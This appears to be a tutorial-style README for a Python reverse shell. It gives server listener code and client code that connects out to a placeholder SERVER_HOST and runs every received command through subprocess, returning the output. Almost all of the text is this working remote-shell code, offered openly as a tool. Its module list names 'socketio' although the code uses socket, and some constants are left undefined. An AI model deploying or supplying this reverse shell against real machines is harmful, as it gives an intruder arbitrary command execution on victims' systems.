# Python Reverse Shell

## Modules used
- os
- socketio
- subprocess
- sys

## Description Server
First of all I created server side. I used socketio to create listening connection.

``` python
import socket

# create a socket object
s = socket.socket()

# bind port and host
s.bind((<SERVER_HOST>, <SERVER_PORT>))
# SERVER_HOST is 0.0.0.0 to get all connections

# started to listen for connection
s.listen()
```

### accept any connections attempted
``` python
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

```

### Create a while loop to stay connection waked
``` python
while True:
    # get the command from prompt
    command = input(f"{cwd} $> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)
```

## Description Client

### import all required models
``` python
import socket
import os
import subprocess
import sys
```

### create the socket object and connect to the server
``` python
s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))
```

### get the current directory
``` python
cwd = os.getcwd()
s.send(cwd.encode())
```

### Creating a loop to stay connection waked
``` python
while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if splited_command[0].lower() == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
    # get the current working directory as output
    cwd = os.getcwd()
    # send the results back to the server
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())
# close client connection
s.close()
```
